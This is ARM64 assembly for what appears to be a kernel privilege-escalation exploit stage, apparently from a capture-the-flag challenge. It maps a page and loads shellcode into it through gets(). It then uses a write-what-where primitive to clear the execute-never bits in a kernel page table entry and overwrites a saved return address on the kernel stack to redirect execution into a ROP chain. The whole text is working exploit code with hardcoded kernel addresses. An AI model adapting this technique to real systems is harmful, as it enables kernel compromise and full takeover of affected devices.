// Padding
NOP
NOP
NOP
NOP

// allocate stack space
STP X29, X30, [SP,#-0x20]!

// unlimit the number of cmd tries
MOV W1, #0xf0000000
STR W1, [SP, #0x10]

// 1. Allocate a page for our code cave
MOV X0, XZR      // base=0
MOV X1, #0x1000  // len=4KB
MOV W2, #3       // prot=RW
MOV W3, #0       // flags=0
MOV W4, #0       // fd=0
MOV X5, #-1      // offset=-1
MOV X8, #0xde    // sys_mmap
SVC 0

// X22 = EL1 shellcode page
MOV X22, X0

// 2. Load shellcode into buffer
// gets(mmap_buffer)
MOV X0, X22
LDR X8, =0x4019B0
BLR X8

// 3. Change the page permissions to PROT_READ + PROT_EXEC
// mprotect(mmap_buffer, 0x1000, 5)
MOV X0, X22      // buffer
MOV X1, #0x1000  // len
MOV X2, #5       // prot=PROT_READ|PROT_EXEC
MOV X8, #0xe2      // sys_mprotect
SVC 0

// 4. Change the PTE XN[54:53] bits to 0b00 (execute all) using write-what-where
// PTE for our fresh mmap
LDR X12, =0xfffffffc0028fe0
NOP

// write a byte to the PTE (remove XN byte)
MOV X0, #0
ADD X1, X12, #6 // write a zero to the XN bit region (54:53, byte 6)
MOV W2, #1
MOV X8, #0x3f
SVC 0

// 5. Allocate a second page to flush the EL1 TLB
MOV X0, XZR      // base=0
MOV X1, #0x1000  // len=4KB
MOV W2, #3       // prot=RW
MOV W3, #0       // flags=0
MOV W4, #0       // fd=0
MOV X5, #-1      // offset=-1
MOV X8, #0xde    // sys_mmap
SVC 0

// 6. Get control over the kernel stack and send it to our mmap'd region
// Target the stack frame to load ROP chain
LDR X10, =0xffffffffc0019c00

.loop:
    MOV X0, #0
    ADD X1, X10, X9
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0 // read(fd=0, buffer=target, n=1)

    ADD X9, X9, #1
    MOV X11, #0x10
    CMP X9, X11
B.MI .loop

// saved LR @ stack address 0xffffffffc0019bb8
// value: 0xffffffffc000a830
LDR X10, =0xffffffffc0019bb8+1
NOP

// write a byte to stack frame saved LR
MOV X0, #0
ADD X1, X10, #0
MOV W2, #1
MOV X8, #0x3f
SVC 0

LDP X29, X30, [SP], 0x20
RET
